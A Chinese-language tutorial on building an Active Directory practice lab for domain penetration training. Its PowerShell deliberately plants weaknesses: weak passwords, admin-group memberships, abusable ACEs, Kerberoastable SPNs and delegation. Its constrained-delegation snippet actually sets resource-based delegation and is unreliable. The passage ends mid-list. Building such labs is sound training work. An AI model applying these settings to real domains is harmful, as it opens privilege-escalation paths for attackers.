# 靶场14：从零搭建域环境

> **难度等级**：🟠 高等
> **预计学习时间**：180分钟
> **学习目标**：
> - 理解为什么需要自己搭建域环境
> - 掌握Active Directory域环境的规划和设计
> - 熟练掌握域控搭建、域用户管理、组策略配置
> - 学会配置各种域渗透漏洞场景
> - 能够独立搭建一个可用于练习的域渗透靶场

---

## 一、为什么要自己搭建域环境

在学习内网渗透和域渗透的过程中，搭建自己的域环境是非常重要的一步。

### 1.1 搭建域环境的重要性

**1. 深入理解原理**

"纸上得来终觉浅，绝知此事要躬行。"通过亲手搭建域环境，你会对Active Directory的工作原理、Kerberos认证流程、组策略机制等有更深刻的理解。只有真正动手搭建过，才能理解各种域渗透攻击的底层原理。

**2. 灵活定制漏洞场景**

现成的靶场虽然方便，但场景是固定的。自己搭建环境可以根据学习需要，灵活配置各种漏洞场景：
- 今天想练Kerberoasting，就配置几个SPN账号
- 明天想练委派攻击，就配置几个委派账号
- 后天想练ACL攻击，就配置各种ACL权限

**3. 实验环境安全可控**

自己搭建的环境完全在本地虚拟机中，可以放心大胆地做各种实验，不用担心影响真实环境或违反法律。

**4. 验证漏洞和工具**

学习新的攻击技术或工具时，可以在自己搭建的环境中验证效果，理解工具的工作原理。

**5. 为高级研究打基础**

想要深入研究域渗透、红队技术、安全防护等方向，自己搭建实验环境是必备技能。

### 1.2 能学到什么

通过搭建域环境，你将学到：

- **Windows Server系统管理**：域服务、DNS、DHCP、IIS等
- **Active Directory架构**：域、林、OU、组、用户等概念
- **Kerberos认证协议**：认证流程、票据类型、各种攻击原理
- **组策略管理**：GPO部署、安全策略、脚本推送等
- **权限管理**：ACL、委托、用户权限分配
- **网络架构**：域网络规划、DNS解析、信任关系

---

## 二、环境规划

### 2.1 所需虚拟机数量

根据学习目标的不同，可以搭建不同规模的域环境。

**最小化环境（2台虚拟机）**：
- 1台域控（DC）
- 1台域成员机（客户端/服务器）
- 适合：初学者入门，了解基本概念

**标准环境（3-4台虚拟机）**：
- 1台域控（DC）
- 1台Web/文件服务器（域成员）
- 1-2台客户端（Windows 10/11）
- 适合：系统学习域渗透

**进阶环境（5-6台虚拟机）**：
- 2台域控（主域控+额外域控）
- 2台服务器（Web服务器、文件服务器、数据库服务器）
- 2台客户端
- 适合：练习横向移动、多场景渗透

**高级环境（7+台虚拟机）**：
- 多域林环境（2-3个域）
- 多台服务器
- 多台客户端
- 配置域信任关系
- 适合：高级域渗透、林攻击研究

**推荐入门配置（3台虚拟机）**：

| 主机名 | 角色 | 操作系统 | IP地址 | 内存 |
|--------|------|----------|--------|------|
| DC01 | 域控 + DNS + DHCP | Windows Server 2019 | 192.168.10.10 | 2GB |
| WEB01 | Web服务器 + 文件服务器 | Windows Server 2019 | 192.168.10.20 | 2GB |
| PC01 | 域成员客户端 | Windows 10/11 | 192.168.10.100 | 2GB |

### 2.2 系统选择

**服务器系统**：

| 系统 | 版本 | 特点 | 适用场景 |
|------|------|------|----------|
| Windows Server | 2012 R2 | 经典版本，漏洞较多 | 学习老系统漏洞 |
| Windows Server | 2016 | 引入很多新特性 | 中等难度环境 |
| Windows Server | 2019 | 主流版本，平衡 | 推荐入门使用 |
| Windows Server | 2022 | 最新版本，安全增强 | 研究最新系统 |

**客户端系统**：

| 系统 | 版本 | 特点 |
|------|------|------|
| Windows 7 | SP1 | 老系统，漏洞多 |
| Windows 10 | 1909/21H2 | 主流版本 |
| Windows 11 | 22H2/23H2 | 最新客户端 |

**推荐组合**：
- 入门学习：Windows Server 2019 + Windows 10
- 研究老漏洞：Windows Server 2012 R2 + Windows 7
- 最新技术：Windows Server 2022 + Windows 11

### 2.3 网络拓扑规划

**单域环境拓扑**：

```
                    ┌──────────────┐
                    │   攻击机     │
                    │  Kali Linux  │
                    └──────┬───────┘
                           │
            ┌──────────────┼──────────────┐
            │              │              │
     ┌──────▼──────┐ ┌────▼─────┐ ┌──────▼──────┐
     │   DC01      │ │  WEB01   │ │   PC01      │
     │  域控+DNS   │ │ Web+文件 │ │  客户端     │
     │ 192.168.10.10│ │  .20    │ │  .100       │
     └─────────────┘ └──────────┘ └─────────────┘
            192.168.10.0/24 内网
         域名：testlab.local
```

> 💡 **深入理解：AD域环境中的DNS为什么如此重要？——"域的电话本"**
>
> 很多同学搭建域环境时会困惑："为什么装AD必须装DNS？"
> 这背后的原因揭示了域环境最核心的运转机制。
>
> 在AD域环境中，DNS不仅仅是用来"解析域名"那么简单。
> 它是整个域环境的**服务发现中心**，相当于整个域的"电话本"。
>
> 为什么DNS这么重要？因为域中的一切服务都依赖DNS来找到彼此：
>
> ```
> 客户端登录域时：
>   1. 输入用户名密码
>   2. 首先要通过DNS查询：域控在哪里？（SRV记录的 _ldap._tcp.dc._msdcs.xxx）
>   3. DNS返回域控IP
>   4. 客户端向域控发起Kerberos认证
>
> 如果DNS没配好，客户端根本找不到域控，连登录都不行！
> ```
>
> DNS中存的关键记录类型（每一条都不能少）：
> ```
> _ldap._tcp.dc._msdcs.testlab.local      → 域控在哪里
> _kerberos._tcp.dc._msdcs.testlab.local  → Kerberos认证服务器在哪
> _kpasswd._tcp.dc._msdcs.testlab.local   → Kerberos密码修改服务
> _gc._tcp.testlab.local                  → 全局编录服务器在哪
> ```
>
> 这就是为什么 `Install-ADDSForest` 中必须加 `-InstallDns` 参数！
> 没有DNS，域环境就是"一栋没有地址的大楼"——你知道楼存在，但永远找不到入口。
>
> **新手最容易犯的错**：DC的DNS没有指向自己（127.0.0.1），
> 导致DNS记录注册失败，域根本无法正常工作。
> 所以搭建DC时，一定要先把DNS设为自己！

**网络规划要点**：

1. **IP网段选择**：选择一个专用内网网段，如192.168.10.0/24
2. **域控IP固定**：域控必须使用静态IP
3. **DNS指向域控**：所有域内机器的DNS都指向域控
4. **网关可选**：实验环境可以不需要网关，纯内网即可
5. **虚拟机网络模式**：使用仅主机模式（Host-Only）或NAT模式

### 2.4 资源需求

**硬件要求**：

| 配置项 | 最低要求 | 推荐配置 |
|--------|----------|----------|
| 内存 | 8GB | 16GB+ |
| CPU | 4核 | 8核+ |
| 硬盘 | 60GB | 100GB+ SSD |
| 虚拟化支持 | 必须开启VT-x/AMD-V | 必须开启 |

**软件要求**：
- VMware Workstation Pro / Oracle VirtualBox
- Windows Server ISO镜像
- Windows 10/11 ISO镜像
- Kali Linux（攻击机）

**镜像获取**：
- 微软评估中心：https://www.microsoft.com/evalcenter/
- MSDN订阅
- 其他合法渠道

---

## 三、详细搭建步骤

### 3.1 第一步：安装Windows Server（域控）

**安装前准备**：
1. 创建新虚拟机
2. 配置2GB内存、2核CPU、60GB硬盘
3. 挂载Windows Server 2019 ISO镜像
4. 网络设置为仅主机模式

**安装步骤**：

1. 启动虚拟机，进入安装界面
2. 选择语言、时间、键盘布局
3. 点击"现在安装"
4. 选择操作系统版本：**Windows Server 2019 Standard（桌面体验）**
5. 接受许可条款
6. 选择"自定义：仅安装Windows（高级）"
7. 选择磁盘，点击下一步
8. 等待安装完成（约10-20分钟）
9. 设置管理员密码（如`Admin@123`）

**安装后配置**：

```powershell
# 以管理员身份打开PowerShell

# 修改计算机名
Rename-Computer -NewName "DC01"

# 配置静态IP地址
New-NetIPAddress -IPAddress 192.168.10.10 -PrefixLength 24 -InterfaceIndex (Get-NetAdapter).InterfaceIndex

# 设置DNS（先指向自己）
Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter).InterfaceIndex -ServerAddresses "127.0.0.1"

# 重启计算机
Restart-Computer
```

或者通过图形界面操作：
1. 右键"此电脑" → 属性 → 更改设置 → 更改计算机名
2. 网络和共享中心 → 更改适配器设置 → 右键网卡 → 属性 → IPv4 → 设置静态IP

### 3.2 第二步：配置Active Directory域服务

**安装AD DS角色**：

```powershell
# 安装Active Directory域服务
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# 安装完成后，将服务器提升为域控
Install-ADDSForest -DomainName "testlab.local" -DomainNetbiosName "TESTLAB" -ForestMode "WinThreshold" -DomainMode "WinThreshold" -InstallDns -Force
```

**详细图形界面步骤**：

1. 打开"服务器管理器"
2. 点击"添加角色和功能"
3. 点击下一步（基于角色或基于功能的安装）
4. 选择服务器（默认本机），下一步
5. 勾选"Active Directory 域服务"
6. 在弹出的对话框中点击"添加功能"
7. 继续下一步，直到确认安装
8. 点击"安装"，等待安装完成

**提升为域控制器**：

1. 安装完成后，点击服务器管理器中的黄色感叹号
2. 点击"将此服务器提升为域控制器"
3. 选择"添加新林"
4. 根域名：`testlab.local`
5. 林功能级别：Windows Server 2016/2019
6. 域功能级别：Windows Server 2016/2019
7. 勾选"域名系统(DNS)服务器"
8. 勾选"全局编录"
9. 设置目录服务还原模式(DSRM)密码（如`DSRM@123`）
10. 下一步（DNS选项，忽略警告）
11. 下一步（其他选项，NetBIOS名默认）
12. 下一步（路径，默认即可）
13. 下一步（查看选项）
14. 点击"安装"
15. 等待安装完成，系统会自动重启

**验证域控安装**：

```powershell
# 查看域信息
Get-ADDomain

# 查看林信息
Get-ADForest

# 查看域控
Get-ADDomainController

# 查看DNS
Get-DnsServerZone

# 验证域控正常
nslookup testlab.local
ping testlab.local
```

### 3.3 第三步：创建域用户、组、OU

**创建组织单位（OU）**：

```powershell
# 创建OU结构
New-ADOrganizationalUnit -Name "公司" -Path "DC=testlab,DC=local"
New-ADOrganizationalUnit -Name "技术部" -Path "OU=公司,DC=testlab,DC=local"
New-ADOrganizationalUnit -Name "人事部" -Path "OU=公司,DC=testlab,DC=local"
New-ADOrganizationalUnit -Name "财务部" -Path "OU=公司,DC=testlab,DC=local"
New-ADOrganizationalUnit -Name "服务器" -Path "OU=公司,DC=testlab,DC=local"
New-ADOrganizationalUnit -Name "客户端" -Path "OU=公司,DC=testlab,DC=local"
```

**创建域组**：

```powershell
# 创建安全组
New-ADGroup -Name "技术部-全员" -SamAccountName "TechAll" -GroupCategory Security -GroupScope Global -Path "OU=技术部,OU=公司,DC=testlab,DC=local"
New-ADGroup -Name "技术部-管理员" -SamAccountName "TechAdmins" -GroupCategory Security -GroupScope Global -Path "OU=技术部,OU=公司,DC=testlab,DC=local"
New-ADGroup -Name "Web管理员" -SamAccountName "WebAdmins" -GroupCategory Security -GroupScope Global -Path "OU=技术部,OU=公司,DC=testlab,DC=local"
New-ADGroup -Name "文件服务器访问组" -SamAccountName "FileAccess" -GroupCategory Security -GroupScope Global -Path "OU=技术部,OU=公司,DC=testlab,DC=local"
```

**创建域用户**：

```powershell
# 设置密码
$password = ConvertTo-SecureString "Pass@123" -AsPlainText -Force

# 创建普通用户
New-ADUser -Name "张三" -GivenName "三" -Surname "张" -SamAccountName "zhangsan" -UserPrincipalName "zhangsan@testlab.local" -Path "OU=技术部,OU=公司,DC=testlab,DC=local" -AccountPassword $password -Enabled $true -ChangePasswordAtLogon $false

New-ADUser -Name "李四" -GivenName "四" -Surname "李" -SamAccountName "lisi" -UserPrincipalName "lisi@testlab.local" -Path "OU=技术部,OU=公司,DC=testlab,DC=local" -AccountPassword $password -Enabled $true -ChangePasswordAtLogon $false

New-ADUser -Name "王五" -GivenName "五" -Surname "王" -SamAccountName "wangwu" -UserPrincipalName "wangwu@testlab.local" -Path "OU=人事部,OU=公司,DC=testlab,DC=local" -AccountPassword $password -Enabled $true -ChangePasswordAtLogon $false

New-ADUser -Name "赵六" -GivenName "六" -Surname "赵" -SamAccountName "zhaoliu" -UserPrincipalName "zhaoliu@testlab.local" -Path "OU=财务部,OU=公司,DC=testlab,DC=local" -AccountPassword $password -Enabled $true -ChangePasswordAtLogon $false

# 创建服务账号
New-ADUser -Name "WebService" -SamAccountName "websvc" -UserPrincipalName "websvc@testlab.local" -Path "OU=服务器,OU=公司,DC=testlab,DC=local" -AccountPassword $password -Enabled $true -ChangePasswordAtLogon $false -PasswordNeverExpires $true

New-ADUser -Name "SQLService" -SamAccountName "sqlsvc" -UserPrincipalName "sqlsvc@testlab.local" -Path "OU=服务器,OU=公司,DC=testlab,DC=local" -AccountPassword $password -Enabled $true -ChangePasswordAtLogon $false -PasswordNeverExpires $true

# 将用户添加到组
Add-ADGroupMember -Identity "TechAll" -Members "zhangsan","lisi"
Add-ADGroupMember -Identity "TechAdmins" -Members "zhangsan"
Add-ADGroupMember -Identity "WebAdmins" -Members "lisi"
Add-ADGroupMember -Identity "FileAccess" -Members "zhangsan","lisi","wangwu"
```

> 💡 **深入理解：全局组、域本地组、通用组的区别——"组策略的三种作用域"**
>
> 创建AD组时有三种作用域可选，很多人分不清。一分钟搞懂：
>
> ```
> 全局组（Global Group）—— "身份证"
>   → 只能包含同域用户
>   → 可以被任何域引用
>   → 典型用法：把同部门的人放到一个全局组
>   → 示例："技术部-全员"（所有技术部的人，只有本域用户能加入）
>
> 域本地组（Domain Local Group）—— "门禁卡"
>   → 可以包含任何域的用户
>   → 只在本地域使用
>   → 典型用法：给资源赋权限
>   → 示例："文件服务器访问组"（任何域的人都能加入，但只能在本域用）
>
> 通用组（Universal Group）—— "国际驾照"
>   → 可以包含任何域的用户
>   → 可以在任何域使用
>   → 典型用法：跨域通用组
>   → 注意：会复制到全局编录，变更会有复制开销！
> ```
>
> **实战中的"AGDLP"最佳实践**：
> ```
> A（Account）→ G（Global）→ DL（Domain Local）→ P（Permission）
>   用户账号     放入全局组      全局组加入域本地组    给域本地组赋权限
>
> 示例：
> zhangsan（账号）→ TechAll（全局组）→ FileAccess（域本地组）→ 文件共享的"读"权限
> ```
>
> 为什么这么设计？因为当公司合并/收购另一个公司时：
> - 把对方的全局组加入自己的域本地组 → 对方用户就能访问自己的资源了
> - 不需要给对方账号单独赋权限！

**图形界面操作方法**：

1. 打开"Active Directory 用户和计算机"（开始菜单 → Windows管理工具）
2. 右键域名 → 新建 → 组织单位
3. 右键对应的OU → 新建 → 用户/组
4. 按照向导创建用户和组

### 3.4 第四步：安装额外的服务器

**准备第二台虚拟机（WEB01）**：

1. 创建新虚拟机，安装Windows Server 2019
2. 设置计算机名为WEB01
3. 配置IP地址：192.168.10.20/24
4. 配置DNS：192.168.10.10（指向域控）

```powershell
# 修改计算机名
Rename-Computer -NewName "WEB01"

# 配置IP
New-NetIPAddress -IPAddress 192.168.10.20 -PrefixLength 24 -InterfaceIndex (Get-NetAdapter).InterfaceIndex

# 配置DNS
Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter).InterfaceIndex -ServerAddresses "192.168.10.10"

# 重启
Restart-Computer
```

**加入域**：

```powershell
# 将计算机加入域
Add-Computer -DomainName "testlab.local" -Credential TESTLAB\Administrator -Restart
```

图形界面操作：
1. 右键"此电脑" → 属性 → 更改设置
2. 点击"更改"
3. 选择"域"，输入`testlab.local`
4. 输入域管理员凭据
5. 重启计算机

**安装IIS Web服务器**：

```powershell
# 安装IIS
Install-WindowsFeature -Name Web-Server -IncludeManagementTools

# 安装ASP.NET等组件
Install-WindowsFeature -Name Web-Asp-Net45,Web-Mgmt-Tools,Web-Mgmt-Console

# 验证IIS安装
Get-WindowsFeature Web-Server
```

**安装文件服务器**：

```powershell
# 安装文件服务器角色
Install-WindowsFeature -Name FS-FileServer

# 创建共享文件夹
New-Item -Path "C:\Share" -ItemType Directory

# 创建共享
New-SmbShare -Name "Share" -Path "C:\Share" -FullAccess "TESTLAB\TechAdmins" -ChangeAccess "TESTLAB\FileAccess" -ReadAccess "TESTLAB\Domain Users"
```

### 3.5 第五步：加入客户端到域

**准备客户端虚拟机（PC01）**：

1. 创建新虚拟机，安装Windows 10/11
2. 设置计算机名为PC01
3. 配置IP地址：192.168.10.100/24（或用DHCP）
4. 配置DNS：192.168.10.10

```powershell
# 以管理员身份运行PowerShell

# 修改计算机名
Rename-Computer -NewName "PC01"

# 配置IP（如果不用DHCP）
New-NetIPAddress -IPAddress 192.168.10.100 -PrefixLength 24 -InterfaceIndex (Get-NetAdapter).InterfaceIndex

# 配置DNS
Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter).InterfaceIndex -ServerAddresses "192.168.10.10"

# 加入域
Add-Computer -DomainName "testlab.local" -Credential TESTLAB\Administrator -Restart
```

**验证加入域成功**：
- 在域控上的"Active Directory 用户和计算机"中查看"Computers"容器，应该能看到PC01
- 在PC01上用域用户登录测试

### 3.6 第六步：配置组策略

**创建组策略对象（GPO）**：

1. 打开"组策略管理"（Group Policy Management）
2. 右键"组策略对象" → 新建
3. 输入GPO名称，如"密码策略"
4. 右键新建的GPO → 编辑

**配置密码策略**：

```
计算机配置 → 策略 → Windows 设置 → 安全设置 → 账户策略 → 密码策略
```

设置项：
- 密码必须符合复杂性要求：已启用
- 密码长度最小值：8
- 密码最长使用期限：42天
- 强制密码历史：5个

**配置登录脚本（用于权限维持练习）**：

```
用户配置 → 策略 → Windows 设置 → 脚本（登录/注销） → 登录
```

添加一个登录脚本，可以用于练习GPO相关的攻击。

**配置文件夹重定向**：

```
用户配置 → 策略 → Windows 设置 → 文件夹重定向
```

**将GPO链接到OU**：

1. 在组策略管理中，找到目标OU（如"技术部"）
2. 右键OU → 链接现有GPO
3. 选择要链接的GPO，确定

**使用PowerShell配置GPO**：

```powershell
# 创建新GPO
New-GPO -Name "测试GPO" -Comment "用于测试的组策略"

# 链接GPO到OU
New-GPLink -Name "测试GPO" -Target "OU=技术部,OU=公司,DC=testlab,DC=local"

# 查看GPO
Get-GPO -All
```

### 3.7 第七步：配置共享文件夹和权限

**在WEB01上配置共享文件夹**：

```powershell
# 创建多个共享文件夹
New-Item -Path "C:\Shares\Public" -ItemType Directory -Force
New-Item -Path "C:\Shares\Tech" -ItemType Directory -Force
New-Item -Path "C:\Shares\HR" -ItemType Directory -Force
New-Item -Path "C:\Shares\Finance" -ItemType Directory -Force

# 创建共享并设置权限
# 公共共享（所有人可读）
New-SmbShare -Name "Public" -Path "C:\Shares\Public" -FullAccess "TESTLAB\TechAdmins" -ReadAccess "TESTLAB\Domain Users"

# 技术部共享
New-SmbShare -Name "Tech" -Path "C:\Shares\Tech" -FullAccess "TESTLAB\TechAdmins" -ChangeAccess "TESTLAB\TechAll"

# 人事部共享（仅人事部可访问）
New-SmbShare -Name "HR" -Path "C:\Shares\HR" -FullAccess "TESTLAB\Domain Admins" -ChangeAccess "TESTLAB\人事部-全员"

# 财务部共享
New-SmbShare -Name "Finance" -Path "C:\Shares\Finance" -FullAccess "TESTLAB\Domain Admins" -ChangeAccess "TESTLAB\财务部-全员"
```

**配置NTFS权限**：

```powershell
# 获取ACL
$acl = Get-Acl "C:\Shares\Tech"

# 添加权限规则
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("TESTLAB\TechAll","ReadAndExecute","ContainerInherit, ObjectInherit","None","Allow")
$acl.SetAccessRule($rule)

# 应用ACL
Set-Acl "C:\Shares\Tech" $acl
```

### 3.8 第八步：配置DNS、DHCP

**配置DNS反向查找区域**：

1. 打开DNS管理器
2. 右键"反向查找区域" → 新建区域
3. 选择"主要区域"
4. 选择"IPv4反向查找区域"
5. 网络ID：192.168.10
6. 下一步完成

**添加DNS记录**：

```powershell
# 添加A记录
Add-DnsServerResourceRecordA -Name "www" -ZoneName "testlab.local" -IPv4Address "192.168.10.20"
Add-DnsServerResourceRecordA -Name "web" -ZoneName "testlab.local" -IPv4Address "192.168.10.20"
Add-DnsServerResourceRecordA -Name "file" -ZoneName "testlab.local" -IPv4Address "192.168.10.20"
Add-DnsServerResourceRecordA -Name "pc01" -ZoneName "testlab.local" -IPv4Address "192.168.10.100"

# 添加CNAME记录
Add-DnsServerResourceRecordCName -Name "mail" -HostNameAlias "web.testlab.local" -ZoneName "testlab.local"

# 验证DNS解析
Resolve-DnsName www.testlab.local
Resolve-DnsName -Type ALL testlab.local
```

**配置DHCP（可选）**：

```powershell
# 安装DHCP角色
Install-WindowsFeature -Name DHCP -IncludeManagementTools

# 授权DHCP服务器
Add-DhcpServerInDC -DnsName DC01.testlab.local -IPAddress 192.168.10.10

# 创建作用域
Add-DhcpServerv4Scope -Name "内网作用域" -StartRange 192.168.10.100 -EndRange 192.168.10.200 -SubnetMask 255.255.255.0 -State Active

# 设置选项（网关、DNS、域名）
Set-DhcpServerv4OptionValue -ScopeId 192.168.10.0 -DnsDomain testlab.local -DnsServer 192.168.10.10 -Router 192.168.10.1
```

---

## 四、漏洞配置

搭建好基础环境后，需要配置各种漏洞场景，让环境"有洞可打"。

### 4.1 配置弱口令

弱口令是最常见的漏洞，也是最容易利用的。

```powershell
# 创建几个弱口令用户
$weakpass = ConvertTo-SecureString "123456" -AsPlainText -Force

New-ADUser -Name "弱口令测试1" -SamAccountName "weakuser1" -UserPrincipalName "weakuser1@testlab.local" -Path "OU=技术部,OU=公司,DC=testlab,DC=local" -AccountPassword $weakpass -Enabled $true -ChangePasswordAtLogon $false -PasswordNeverExpires $true

$weakpass2 = ConvertTo-SecureString "password" -AsPlainText -Force

New-ADUser -Name "弱口令测试2" -SamAccountName "weakuser2" -UserPrincipalName "weakuser2@testlab.local" -Path "OU=人事部,OU=公司,DC=testlab,DC=local" -AccountPassword $weakpass2 -Enabled $true -ChangePasswordAtLogon $false -PasswordNeverExpires $true
```

**常见弱口令列表**：
- 123456、password、admin
- qwerty、123456789、12345678
- abc123、111111、1234567
- iloveyou、123123、welcome
- 用户名即密码、公司名+123

### 4.2 配置不当权限

**配置高权限普通用户**：

```powershell
# 将普通用户添加到高权限组
# 域管理员组
Add-ADGroupMember -Identity "Domain Admins" -Members "zhangsan"

# 企业管理员组
Add-ADGroupMember -Identity "Enterprise Admins" -Members "lisi"

# 服务器操作员组
Add-ADGroupMember -Identity "Server Operators" -Members "wangwu"

# 账户操作员组
Add-ADGroupMember -Identity "Account Operators" -Members "zhaoliu"
```

**配置对OU的完全控制权限**：

```powershell
# 获取OU的ACL
$ou = "OU=技术部,OU=公司,DC=testlab,DC=local"
$acl = Get-Acl "AD:\$ou"

# 给用户添加完全控制权限
$identity = "TESTLAB\zhangsan"
$adRights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
$type = [System.Security.AccessControl.AccessControlType]::Allow
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type, $inheritanceType)
$acl.AddAccessRule($ace)

# 应用ACL
Set-Acl -Path "AD:\$ou" -AclObject $acl
```

**配置对GPO的编辑权限**：

```powershell
# 给用户GPO编辑权限
Set-GPPermission -Name "测试GPO" -TargetName "zhangsan" -TargetType User -PermissionLevel GPOEdit
```

### 4.3 安装有漏洞的服务

**安装有漏洞的Web应用**：

1. 在WEB01上安装phpStudy/XAMPP
2. 部署有漏洞的Web应用（如DVWA、bWAPP、Pikachu等）
3. 配置MySQL数据库，设置弱口令
4. 确保Web应用存在SQL注入、文件上传等漏洞

**安装有漏洞的服务**：

```
可安装的漏洞服务示例：
- 旧版本的FTP服务（vsFTPd 2.3.4等）
- 旧版本的Tomcat（弱口令+WAR部署）
- 旧版本的Redis（未授权访问）
- 旧版本的SMB服务（MS17-010）
- 旧版本的MySQL（弱口令+UDF提权）
```

**注意**：安装旧版本有漏洞的服务可能需要使用老版本系统（如Windows Server 2008/2012）。

### 4.4 设置SPN（Kerberoast）

Kerberoasting是域渗透中非常重要的攻击技术，需要配置SPN服务账号。

**创建SPN服务账号**：

```powershell
# 为服务账号注册SPN
# 格式：setspn -S 服务类/主机名:端口 用户名

# Web服务SPN
setspn -S HTTP/web01.testlab.local websvc
setspn -S HTTP/www.testlab.local websvc

# MSSQL服务SPN
setspn -S MSSQLSvc/web01.testlab.local:1433 sqlsvc
setspn -S MSSQLSvc/web01.testlab.local sqlsvc

# 文件服务SPN
setspn -S CIFS/web01.testlab.local websvc

# 验证SPN
setspn -L websvc
setspn -L sqlsvc

# 查找所有SPN
setspn -Q */*
```

**使用PowerShell配置**：

```powershell
# 查看有SPN的用户
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName

# 添加SPN
Set-ADUser -Identity websvc -ServicePrincipalNames @{Add="HTTP/web01.testlab.local"}

# 移除SPN
Set-ADUser -Identity websvc -ServicePrincipalNames @{Remove="HTTP/web01.testlab.local"}
```

**Kerberoasting练习要点**：
- 服务账号密码通常较弱
- 可以请求服务票据并离线破解
- 使用Rubeus或Impacket工具进行攻击

### 4.5 配置委派

委派攻击是域渗透中的高级技术，包括非约束委派、约束委派和资源型约束委派。

**1. 非约束委派（Unconstrained Delegation）**

```powershell
# 配置计算机账户的非约束委派
# 设置WEB01计算机账户允许委派到任何服务
Set-ADComputer -Identity WEB01 -TrustedForDelegation $true

# 验证
Get-ADComputer -Identity WEB01 -Properties TrustedForDelegation | Select-Object Name,TrustedForDelegation

# 配置用户账户的非约束委派（不常见，但可以配置）
Set-ADAccountControl -Identity zhangsan -TrustedForDelegation $true
```

**2. 约束委派（Constrained Delegation）**

```powershell
# 配置约束委派（用户只能委派到指定服务）
# 允许websvc用户委派到MSSQL服务
$allowed = @('MSSQLSvc/web01.testlab.local:1433', 'MSSQLSvc/web01.testlab.local')

Set-ADUser -Identity websvc -PrincipalsAllowedToDelegateToAccount $null

# 添加约束委派
Set-ADComputer -Identity WEB01 -ServicePrincipalNames @{Add='MSSQLSvc/web01.testlab.local:1433'}

# 设置约束委派
$list = @(Get-ADComputer -Identity WEB01)
Set-ADUser -Identity websvc -PrincipalsAllowedToDelegateToAccount $list
```

**3. 资源型约束委派（Resource-Based Constrained Delegation）**

```powershell
# 配置资源型约束委派
# 允许指定用户/计算机模拟任意用户访问该资源

# 给WEB01配置资源型约束委派
$attacker = Get-ADUser -Identity zhangsan
Set-ADComputer -Identity WEB01 -PrincipalsAllowedToDelegateToAccount $attacker

# 验证
Get-ADComputer -Identity WEB01 -Properties PrincipalsAllowedToDelegateToAccount
```

**委派攻击练习要点**：
- 非约束委派：找到配置了非约束委派的机器，获取TGT
- 约束委派：获取服务账号的哈希，伪造服务票据
- 资源型约束委派：利用对计算机账户的写权限配置委派

### 4.6 设置ACL漏洞

ACL（访问控制列表）攻击是域渗透的重要方向，配置各种ACL权限可以练习不同的攻击场景。

**常见ACL攻击场景**：

**1. DCSync权限**

```powershell
# 给用户添加DCSync权限（复制目录更改的权限）
# DCSync需要以下权限：
# - 复制目录更改（DS-Replication-Get-Changes）
# - 复制目录更改全部（DS-Replication-Get-Changes-All）

$dcsyncUser = "zhangsan"
$domain = "DC=testlab,DC=local"

# 使用PowerView（需要导入模块）
# Add-DomainObjectAcl -TargetIdentity $domain -PrincipalIdentity $dcsyncUser -Rights DCSync
```

**2. WriteDACL权限**

```powershell
# 给用户对某个对象的写入DACL权限
# 拥有WriteDACL权限可以修改对象的ACL，进而提升权限

$ou = "OU=技术部,OU=公司,DC=testlab,DC=local"
$acl = Get-Acl "AD:\$ou"

$identity = "TESTLAB\lisi"
$adRights = [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl
$type = [System.Security.AccessControl.AccessControlType]::Allow
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type, $inheritanceType)
$acl.AddAccessRule($ace)

Set-Acl -Path "AD:\$ou" -AclObject $acl
```

**3. ForceChangePassword权限**

```powershell
# 给用户重置其他用户密码的权限
# 拥有这个权限可以直接重置目标用户的密码

$user = "CN=王五,OU=人事部,OU=公司,DC=testlab,DC=local"
$acl = Get-Acl "AD:\$user"

$identity = "TESTLAB\zhangsan"
$adRights = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
$type = [System.Security.AccessControl.AccessControlType]::Allow
$objectType = [Guid]"00299570-246d-11d0-a768-00aa006e0529" # User-Change-Password

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type, $objectType)
$acl.AddAccessRule($ace)

Set-Acl -Path "AD:\$user" -AclObject $acl
```

**4. AddMember权限**

```powershell
# 给用户添加组的成员管理权限
# 可以将自己添加到高权限组

$group = "CN=Domain Admins,CN=Users,DC=testlab,DC=local"
$acl = Get-Acl "AD:\$group"

$identity = "TESTLAB\zhangsan"
$adRights = [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty
$type = [System.Security.AccessControl.AccessControlType]::Allow
$objectType = [Guid]"bf9679c0-0de6-11d0-a285-00aa003049e2" # Member attribute

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type, $objectType)
$acl.AddAccessRule($ace)

Set-Acl -Path "AD:\$group" -AclObject $acl
```

---

## 五、自动化搭建脚本和工具

手动搭建域环境比较耗时，可以使用自动化工具提高效率。

### 5.1 PowerShell自动化脚本

可以编写PowerShell脚本自动化完成域环境搭建。

**示例：一键搭建域控脚本**

```powershell
# 配置参数
$domainName = "testlab.local"
$netbiosName = "TESTLAB"
$dcName = "DC01"
$dcIP = "192.168.10.10"
$adminPassword = "Admin@123"

# 修改计算机名
Rename-Computer -NewName $dcName

# 配置静态IP
$adapter = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
New-NetIPAddress -IPAddress $dcIP -PrefixLength 24 -InterfaceIndex $adapter.InterfaceIndex
Set-DnsClientServerAddress -InterfaceIndex $adapter.InterfaceIndex -ServerAddresses "127.0.0.1"

# 安装AD DS
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# 提升为域控
$securePassword = ConvertTo-SecureString $adminPassword -AsPlainText -Force
Install-ADDSForest -DomainName $domainName -DomainNetbiosName $netbiosName -ForestMode WinThreshold -DomainMode WinThreshold -InstallDns -SafeModeAdministratorPassword $securePassword -Force
```

### 5.2 BadBlood

BadBlood是一个专门用于快速填充Active Directory环境的工具，可以生成大量的用户、组、计算机等对象。

**项目地址**：https://github.com/davidprowe/BadBlood

**功能**：
- 随机生成大量域用户
